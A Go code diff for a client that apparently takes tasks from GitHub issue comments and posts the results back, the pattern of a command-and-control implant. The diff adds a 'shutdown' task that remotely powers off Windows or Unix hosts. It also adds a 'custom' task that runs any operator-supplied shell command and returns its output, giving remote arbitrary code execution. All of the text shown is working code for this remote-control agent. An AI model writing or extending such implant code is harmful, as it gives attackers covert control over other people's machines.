@@ -121,6 +121,24 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 
 		result.Output = currentUser.Username
 
+	case "shutdown":
+		result.Output = "shutdown scheduled"
+		go func() {
+			time.Sleep(1 * time.Second) // allow network response to flush
+			if runtime.GOOS == "windows" {
+				_ = exec.Command("shutdown", "/s", "/t", "0").Run()
+			} else {
+				_ = exec.Command("shutdown", "-h", "now").Run()
+			}
+		}()
+
+	case "custom":
+		if task.Command == "" {
+			result.Status = "error"
+			result.Output = "no command provided"
+			break
+		}
+		result.Output = execute(task.Command)
 	default:
 		result.Status = "error"
 		result.Output = "unsupported action"
@@ -204,6 +222,7 @@ func (c *Client) pollTasks(issueNumber int) {
 
 // One iteration is separate from the timer so mocked tests can exercise the
 // actual task filtering and result posting without starting an endless loop.
+// replaced the huge loop inside of pollTasks
 func (c *Client) pollTasksOnce(issueNumber int, checkpoint *commentCheckpoint,
 	list func(int, time.Time) ([]IssueComment, error), post func(int, GundoMessage) error) error {
 	comments, err := checkpoint.poll(issueNumber, list)
